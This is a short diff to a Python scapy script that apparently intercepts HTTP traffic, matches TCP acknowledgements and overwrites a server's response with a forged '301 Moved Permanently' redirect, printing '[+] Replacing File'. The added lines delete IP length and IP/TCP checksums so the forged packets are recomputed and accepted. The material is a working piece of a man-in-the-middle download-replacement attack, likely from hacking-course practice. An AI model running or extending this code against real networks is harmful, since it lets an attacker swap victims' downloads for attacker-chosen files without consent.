@@ -24,6 +24,10 @@ def process_packet(packet):
                 ack_list.remove(scapy_packet[scapy.TCP].seq)
                 print("[+] Replacing File")
                 scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: www.microsoft.com"
+#del and scapy will auto complete for each modified packet
+                del scapy_packet[scapy.IP].len
+                del scapy_packet[scapy.IP].chksum
+                del scapy_packet[scapy.TCP].chksum
 
     packet.accept()
 
